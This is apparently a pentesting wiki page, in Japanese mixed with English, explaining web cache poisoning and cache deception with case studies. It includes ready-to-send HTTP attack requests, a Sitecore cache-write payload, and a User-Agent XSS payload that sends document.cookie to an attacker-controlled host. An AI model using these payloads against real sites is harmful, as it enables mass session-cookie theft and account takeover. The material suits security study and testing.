# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## 違い

> **web cache poisoning と web cache deception の違いは何ですか？**
>
> - **web cache poisoning** においては、攻撃者はアプリケーションに悪意のあるコンテンツをキャッシュに保存させ、そのコンテンツがキャッシュから他のアプリケーション利用者に提供されます。
> - **web cache deception** においては、攻撃者はアプリケーションに別ユーザーに属する機密コンテンツをキャッシュに保存させ、攻撃者はそのコンテンツをキャッシュから取得します。

## Cache Poisoning

Cache poisoning はクライアント側のキャッシュを操作して、クライアントが予期しない、部分的な、または攻撃者の管理下にあるリソースを読み込ませることを目的としています。影響の範囲は対象ページの人気度に依存します。汚染されたレスポンスはキャッシュが汚染されている期間にそのページを訪れるユーザーにのみ配信されます。

Cache poisoning 攻撃の実行は以下のステップを含みます:

1. **Identification of Unkeyed Inputs**: キャッシュされるために必須ではないパラメータだが、サーバーが返すレスポンスを変更できる入力を特定すること。これらの入力を特定することは、キャッシュを操作するために重要です。
2. **Exploitation of the Unkeyed Inputs**: 特定した unkeyed inputs をどのように悪用してサーバーのレスポンスを攻撃者に有利な形に変更するかを見つけます。
3. **Ensuring the Poisoned Response is Cached**: 操作したレスポンスがキャッシュに保存されることを確認します。こうすることで、キャッシュが汚染されている間に該当ページにアクセスしたユーザーは改ざんされたレスポンスを受け取ります。

### Discovery: Check HTTP headers

通常、レスポンスが**キャッシュに保存された**場合、それを示す**ヘッダー**が付加されます。どのヘッダーに注意すべきかはこの投稿を確認してください: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Discovery: Caching error codes

レスポンスがキャッシュに保存されているかを確認したい場合、**無効なヘッダー**でリクエストを送ってみて、通常は**status code 400**で応答されるはずです。その後通常どおりリクエストにアクセスして、**レスポンスが 400 の status code**であれば脆弱であることがわかります（DoS を行うことさえ可能です）。

以下でさらにオプションを確認できます:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

ただし、**これらの種類のステータスコードはキャッシュされないことがある**ため、このテストは常に信頼できるわけではない点に注意してください。

### Discovery: Identify and evaluate unkeyed inputs

ページのレスポンスを変更している可能性のあるパラメータやヘッダーを **brute-force parameters and headers** するために [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) を使うことができます。例えば、ページが `X-Forwarded-For` ヘッダーを利用してクライアントにそこからスクリプトを読み込ませるよう指示している場合があります:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### バックエンドサーバーから有害なレスポンスを引き出す

parameter/header を特定したら、それがどのように **サニタイズ** されているか、また **どこに** **反映されている** ／ レスポンスにどのように影響しているかを確認します。これを悪用できますか（XSS を実行したり、自分で制御する JS を読み込ませることはできるか？DoS を引き起こせるか？...）

### レスポンスをキャッシュさせる

悪用可能な **page**、どの **parameter**/**header** を使うか、そしてどのように **abuse** するかを **identified** したら、その page をキャッシュさせる必要があります。キャッシュに入るまでリソースによっては時間がかかることがあり、数秒間試行を続ける必要があるかもしれません。

レスポンスのヘッダ **`X-Cache`** は、リクエストがキャッシュされていないときに値が **`miss`**、キャッシュされているときに **`hit`** になる可能性があるため非常に有用です。\
ヘッダ **`Cache-Control`** もリソースがキャッシュされているか、次にいつ再キャッシュされるかを知るのに重要です: `Cache-Control: public, max-age=1800`

もう一つ興味深いヘッダは **`Vary`** です。このヘッダはしばしば **追加のヘッダを示す** のに使われ、通常はキー化されないヘッダであっても **cache key の一部として扱われる** ことがあります。したがって、攻撃対象のユーザの `User-Agent` を知っていれば、その特定の `User-Agent` を使うユーザ向けに poison the cache することができます。

キャッシュに関連するもう一つのヘッダは **`Age`** です。これはオブジェクトがプロキシキャッシュに置かれてからの経過秒数を定義します。

リクエストをキャッシュするときは、使用するヘッダに注意してください。なぜなら一部は **予期せず** **keyed** として使われる可能性があり、**victim は同じヘッダを使う必要がある** からです。常に Cache Poisoning を **試験** するときは **異なるブラウザ** で動作を確認してください。

## Exploiting Examples

### 一番簡単な例

`X-Forwarded-For` のようなヘッダがレスポンスにサニタイズされずに反映されている。\
基本的な XSS ペイロードを送信してキャッシュを poison the cache すれば、その page にアクセスする全員が XSSed されます:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_この操作は `/en?region=uk` へのリクエストを poison し、`/en` へのリクエストは poison しない点に注意してください_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning through CDNs

この **[this writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** では、次の単純なシナリオが説明されています:

- CDN は `/share/` 以下のコンテンツをすべて cache します。
- CDN は `%2F..%2F` をデコードも正規化もしません。したがって、`https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` のように、cache される他の機密箇所へアクセスするための **path traversal to access other sensitive locations that will be cached** として利用できます。
- Web server は `%2F..%2F` をデコード・正規化し、`/api/auth/session` で応答します。これは **contains the auth token**。

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Cookies はページのレスポンスにも反映されることがあります。例えばそれを悪用して XSS を発生させられれば、悪意ある cache response を読み込む複数のクライアントで XSS を悪用できる可能性があります。
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Note that if the vulnerable cookie is very used by the users, regular requests will be cleaning the cache.

### デリミタ、正規化とドットによる不一致の生成 <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Check:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning with path traversal to steal API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**This writeup explains**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) how it was possible to steal an OpenAI API key with an URL like `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` because anything matching `/share/*` will be cached without Cloudflare normalising the URL, which was done when the request reached the web server.

This is also explained better in:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### 複数のヘッダを使って web cache poisoning 脆弱性を悪用する <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

場合によっては、キャッシュを悪用するために **exploit several unkeyed inputs** が必要になります。例えば、`X-Forwarded-Host` をあなたが管理するドメインに設定し、`X-Forwarded-Scheme` を `http` にすると、**Open redirect** が見つかることがあります。**If** the **server** is **forwarding** all the **HTTP** requests **to HTTPS** and using the header `X-Forwarded-Scheme` as the domain name for the redirect, you can control where the page is pointed by the redirect.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Exploiting with limited `Vary`header

もし**`X-Host`**ヘッダが**JSリソースをロードするためのドメイン名**として使用されているが、レスポンスの**`Vary`**ヘッダが**`User-Agent`**を示していることが分かったら、被害者のUser-Agentをexfiltrateし、そのuser agentを使ってキャッシュをpoisonする方法を見つける必要があります:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

URL と body の両方に同じリクエストを含めた GET リクエストを送信します。  
web server が body のほうを使い、cache server が URL のほうをキャッシュしていると、その URL にアクセスする誰もが実際には body にある parameter を使うことになります。  
James Kettle が Github website で見つけた vuln のように:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
There it a portswigger lab about this: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

For example it's possible to separate **parameters** in ruby servers using the char **`;`** instead of **`&`**. This could be used to put unkeyed parameters values inside keyed ones and abuse them.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

ここでは、[Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning) を利用してどのように攻撃を行うかを学べます。

### Automated testing for Web Cache Poisoning

[Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) は、web cache poisoning の自動テストに使えます。多くの手法をサポートしており、高度にカスタマイズ可能です。

Example usage: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

実際の事例では、ヘッダ反射の脆弱性と CDN/WAF の挙動を組み合わせることで、他のユーザに提供されるキャッシュされた HTML を確実に汚染するパターンが観測されます:

- メインの HTML が信頼できないリクエストヘッダ（例: `User-Agent`）を実行可能なコンテキストに反映していた。
- CDN が cache ヘッダを削除していたが、内部／origin 側にキャッシュが存在した。CDN は静的拡張子で終わるリクエスト（例: `.js`）を自動でキャッシュし、WAF は静的アセットに対する GET に対してより緩いコンテンツ検査を適用していた。
- リクエストフローの特異性により、`.js` パスへのリクエストが後続のメイン HTML に使われるキャッシュキー／バリアントに影響を与え、header reflection を介したクロスユーザ XSS を可能にしていた。

Practical recipe (observed across a popular CDN/WAF):

1) クリーンな IP から（以前のレピュテーションによる扱い下げを避けるため）、ブラウザまたは Burp Proxy Match & Replace を使って悪意ある `User-Agent` を設定する。  
2) Burp Repeater で 2 つのリクエストを準備し、"Send group in parallel"（single-packet mode が最適）を使う:
- 最初のリクエスト: 同一オリジン上の `.js` リソースパスに対して、悪意ある `User-Agent` を送って GET する。
- 直後に: メインページ（`/`）を GET する。
3) CDN/WAF のルーティングレースと auto-cached `.js` により、汚染された HTML のキャッシュバリアントがシードされ、同じキャッシュキー条件（例: `Vary` の次元が同じ、`User-Agent` 等）を共有する他の訪問者に対して配信されることが多い。

Example header payload (to exfiltrate non-HttpOnly cookies):
```
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational tips:

- 多くの CDN はキャッシュヘッダーを隠すため、poisoning は数時間単位のリフレッシュサイクルでしか現れないことがあります。レートリミットやレピュテーショントリガーを避けるため、複数の観測ポイントとなる IP を使用し、スロットルしてください。
- CDN の自前のクラウド上の IP を使うと、ルーティングの一貫性が改善されることがあります。
- 厳格な CSP が存在する場合でも、reflection がメインの HTML コンテキストで実行され、CSP がインライン実行を許可するかコンテキストでバイパスされる場合は動作します。

Impact:

- セッションCookieが `HttpOnly` でない場合、poisoned HTML が配信されたすべてのユーザーから `document.cookie` を大量に窃取することで、zero-click ATO が可能になります。

Defenses:

- リクエストヘッダーを HTML に反映するのをやめてください。どうしても必要な場合は厳密にコンテキストエンコードしてください。CDN と origin のキャッシュポリシーを整合させ、信頼できないヘッダーでバリアントさせないようにしてください。
- WAF が `.js` リクエストや静的パスに対して一貫してコンテンツ検査を適用することを確認してください。
- セッションCookieに `HttpOnly`（および `Secure`, `SameSite`）を設定してください。

### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

Sitecore‑specific なパターンにより、pre‑auth XAML ハンドラと AjaxScriptManager の reflection を悪用して HtmlCache への未認証の書き込みが可能になります。`Sitecore.Shell.Xaml.WebControl` ハンドラに到達すると、`xmlcontrol:GlobalHeader`（`Sitecore.Web.UI.WebControl` から派生）が利用可能になり、次の reflective call が許可されます:
```
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
This writes arbitrary HTML under an attacker‑chosen cache key, enabling precise poisoning once cache keys are known.

For full details (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## 脆弱な例

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS は URL 内の fragment を削除せずに転送し、cache key を host, path, query のみで生成していました（fragment を無視）。そのためリクエスト `/#/../?r=javascript:alert(1)` はバックエンドに `/#/../?r=javascript:alert(1)` として送信されましたが、cache key には payload が含まれず、host, path, query のみが使用されました。

### GitHub CP-DoS

content-type header に悪い値を送ると 405 の cached response が発生しました。cache key に cookie が含まれていたため、攻撃は未認証ユーザに限定されました。

### GitLab + GCP CP-DoS

GitLab は静的コンテンツの保存に GCP buckets を使っています。**GCP Buckets** は **header `x-http-method-override`** をサポートしているため、`x-http-method-override: HEAD` を送って cache を空のレスポンスボディに poison することが可能でした。`PURGE` メソッドもサポートされていました。

### Rack Middleware (Ruby on Rails)

Ruby on Rails アプリケーションでは Rack middleware がよく使われます。Rack コードは **`x-forwarded-scheme`** ヘッダの値を取得してリクエストの scheme に設定します。`x-forwarded-scheme: http` を送ると同じ場所へ 301 リダイレクトが発生し、そのリソースに対する Denial of Service (DoS) を引き起こす可能性があります。さらに、アプリケーションが `X-forwarded-host` ヘッダを認識して指定されたホストへリダイレクトする場合、攻撃者のサーバから JavaScript ファイルを読み込ませることができ、セキュリティリスクとなります。

### 403 と Storage Buckets

Cloudflare は以前 403 レスポンスをキャッシュしていました。S3 や Azure Storage Blobs に対して誤った Authorization ヘッダでアクセスを試みると 403 レスポンスが返り、それがキャッシュされました。Cloudflare は現在 403 レスポンスのキャッシュを停止していますが、他のプロキシサービスでは同様の挙動が残っている場合があります。

### Injecting Keyed Parameters

キャッシュはしばしば特定の GET パラメータを cache key に含めます。例えば Fastly の Varnish はリクエストの `size` パラメータをキャッシュしました。しかし、パーセントエンコードされた同じパラメータ（例: `siz%65`）を誤った値で送ると、cache key は正しい `size` パラメータを使って構築される一方で、バックエンドは URL エンコードされたパラメータの値を処理します。2つ目の `size` パラメータを URL エンコードすると cache からは無視されるがバックエンドで使われるようになり、このパラメータに 0 を割り当てるとキャッシュ可能な 400 Bad Request エラーが発生しました。

### User Agent Rules

一部の開発者は FFUF や Nuclei のような高トラフィックツールに似た user-agent をブロックしてサーバ負荷を抑えようとします。皮肉なことに、このアプローチは cache poisoning や DoS といった脆弱性を招くことがあります。

### Illegal Header Fields

[https://datatracker.ietf.mrg/doc/html/rfc7230](https://datatracker.ietf.mrg/doc/html/rfc7230) はヘッダ名で許容される文字を定めています。指定の **tchar** 範囲外の文字を含むヘッダは本来 400 Bad Request を返すべきですが、実際のサーバは常にこの標準に従うわけではありません。顕著な例として Akamai があり、無効な文字を含むヘッダを転送し、`cache-control` ヘッダが存在しない限り 400 エラーをキャッシュしてしまいます。例えば `\` のような不正文字を含むヘッダを送るとキャッシュ可能な 400 Bad Request エラーになるというパターンが確認されました。

### Finding new headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

The goal of Cache Deception is to make clients **load resources that are going to be saved by the cache with their sensitive information**.

まず、`.css`, `.js`, `.png` 等の拡張子は通常キャッシュに保存されるよう**設定**されていることが多い点に注意してください。したがって `www.example.com/profile.php/nonexistent.js` にアクセスすると、拡張子が `.js` と見なされるためレスポンスがキャッシュされる可能性があります。しかし、もしアプリケーションが _www.example.com/profile.php_ の中に保存された**機密**ユーザ内容を返している場合、他のユーザの機密情報を **盗む** ことが可能になります。

他に試すべきもの:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

より明確な例はこのレポートにあります: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
その例では、_http://www.example.com/home.php/non-existent.css_ のような存在しないページを読み込むと、_http://www.example.com/home.php_（**ユーザの機密情報を含む**）の内容が返され、キャッシュサーバがその結果を保存することが説明されています。\
その後、**attacker** は自分のブラウザで _http://www.example.com/home.php/non-existent.css_ にアクセスし、以前にアクセスしたユーザの **機密情報** を観察することができます。

cache proxy がファイルの拡張子（_.css_）に基づいてファイルを **cache** するように **設定**されており、content-type ではなく拡張子で判断している必要がある点に注意してください。例では _http://www.example.com/home.php/non-existent.css_ の content-type は `text/html` であり `text/css` ではありません。

HTTP Request Smuggling を利用して Cache Deceptions を実行する方法については次を参照してください: [ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

## 自動ツール

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang スキャナ。URL リストから web cache poisoning の脆弱性を発見し、複数の注入手法をテストします。

## 参考

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)


{{#include ../../banners/hacktricks-training.md}}
